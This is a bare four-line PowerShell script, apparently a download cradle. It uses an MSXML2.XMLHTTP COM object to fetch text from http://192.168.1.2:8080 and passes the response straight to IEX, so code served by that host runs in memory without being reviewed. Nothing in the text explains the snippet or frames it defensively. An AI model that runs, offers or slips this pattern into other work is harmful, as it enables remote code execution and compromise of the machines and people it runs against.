$socket = New-Object -ComObject MSXML2.XMLHTTP
$socket.open("GET", "http://192.168.1.2:8080", $false)
$socket.send()
IEX $socket.responseText
